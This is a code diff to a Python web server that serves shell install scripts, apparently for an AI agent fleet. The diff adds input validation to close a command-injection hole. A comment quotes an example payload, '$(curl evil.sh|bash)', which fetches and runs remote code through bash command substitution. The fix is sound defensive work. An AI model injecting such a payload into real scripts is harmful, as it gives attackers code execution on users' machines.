@@ -17,6 +17,7 @@ Two trust boundaries, deliberately different:
 """
 
 import os
+import re
 from contextlib import asynccontextmanager
 from pathlib import Path
 
@@ -157,6 +158,33 @@ def _default_model() -> str:
     return os.environ.get("FLEET_DEFAULT_MODEL", "hermes3")
 
 
+# `model` and `token` end up embedded in TWO dangerous contexts: a shell
+# one-liner shown on /connect, and a bash script served by /agent.sh whose
+# only purpose is to be piped straight into `bash`. Both embeddings happen
+# inside double-quoted assignments (MODEL="...", TOKEN="..."), and bash
+# still runs $(...) command substitution INSIDE double quotes -- so an
+# unvalidated model value like `$(curl evil.sh|bash)` becomes arbitrary code
+# execution on whoever runs the resulting one-liner, host or friend alike.
+# Rather than trying to escape correctly for two different embedding
+# contexts (shell arg quoting AND a template substitution), reject anything
+# that isn't obviously a model name or token at the boundary. Confirmed
+# exploitable with a real payload before this fix went in.
+_SAFE_MODEL_RE = re.compile(r"^[A-Za-z0-9._:/-]{1,128}$")
+_SAFE_TOKEN_RE = re.compile(r"^[A-Za-z0-9_-]{1,128}$")
+
+
+def _validate_model(model: str) -> str:
+    if not _SAFE_MODEL_RE.match(model):
+        raise HTTPException(400, "invalid model name")
+    return model
+
+
+def _validate_token(token: str) -> str:
+    if not _SAFE_TOKEN_RE.match(token):
+        raise HTTPException(400, "invalid token format")
+    return token
+
+
 def _build_install_command(model: str) -> str:
     host_url = f"http://{settings.advertise_ip or '<your-tailscale-ip>'}:{settings.port}"
     tailscale_up = (
@@ -174,7 +202,7 @@ def _build_install_command(model: str) -> str:
 
 @app.get("/connect", response_class=HTMLResponse)
 def connect(request: Request, model: str = ""):
-    chosen_model = model or _default_model()
+    chosen_model = _validate_model(model) if model else _default_model()
     return templates.TemplateResponse(
         request,
         "connect.html",
@@ -192,8 +220,9 @@ def agent_script(request: Request, token: str = "", model: str = ""):
     # Not gated on the invite token: the SCRIPT isn't the secret, the
     # /api/register call it makes later is (and that's checked there). An
     # invalid token embedded here just means registration 401s downstream.
-    token = token or settings.invite_token
-    model = model or _default_model()
+    # It IS validated for shape, though -- see _validate_token above.
+    token = _validate_token(token) if token else settings.invite_token
+    model = _validate_model(model) if model else _default_model()
     host_url = f"http://{settings.advertise_ip or request.client.host}:{settings.port}"
 
     script = AGENT_TEMPLATE.read_text()
